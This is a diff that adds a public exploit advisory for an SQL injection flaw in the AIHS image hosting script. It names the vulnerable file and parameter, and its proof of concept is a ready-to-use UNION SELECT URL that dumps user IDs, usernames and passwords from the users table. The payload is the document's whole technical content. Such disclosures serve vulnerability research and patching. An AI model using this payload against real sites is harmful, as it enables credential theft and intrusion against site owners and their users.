@@ -1,0 +1,27 @@
+# Exploit Title: AIHS (Advanced Image Hosting Script) SQL Injection Vulnerability
+# Author: Robert Cooper ( Robert.Cooper [at] areyousecure.net )
+# Software Link: http://yabsoft.com/
+# Tested on: [Linux/Windows 7]
+
+#Vulnerable File:
+ 
+view_comments.php
+
+#Vulnerable parameter:
+
+view_comments.php?gal=[gallery id]
+
+ 
+##############################################################
+PoC:
+ 
+www.example.com/view_comments.php?gal=109 union all select 1,2,3,4,5,6,7,group_concat(id,0x3a,user,0x3a,pass,0x0a) FROM users--
+ 
+##############################################################
+
+www.areyousecure.net
+
+www.websiteauditing.org
+
+ 
+# Shouts to the Belegit crew
